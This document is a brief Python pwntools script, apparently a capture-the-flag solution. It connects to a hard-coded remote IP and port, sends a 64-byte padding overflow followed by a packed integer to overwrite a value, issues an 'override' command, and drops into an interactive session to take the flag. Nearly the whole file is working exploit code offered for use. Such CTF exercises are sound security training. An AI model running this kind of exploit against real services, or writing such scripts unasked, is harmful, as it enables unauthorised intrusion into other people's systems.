#!/usr/bin/env python3
from pwn import *

# ----------------------------
# Configuration
# ----------------------------
HOST = '16.16.199.115'   # change if needed
PORT = 9007

# ----------------------------
# Connect to remote server
# ----------------------------
p = remote(HOST, PORT)

# ----------------------------
# Exploit
# ----------------------------
payload  = b"A" * 64
payload += p32(1)

p.sendafter(b"Command >", payload)
p.sendafter(b"\n", b"")

p.sendlineafter(b"Command >", b"override")

# ----------------------------
# Get the flag
# ----------------------------
p.interactive()
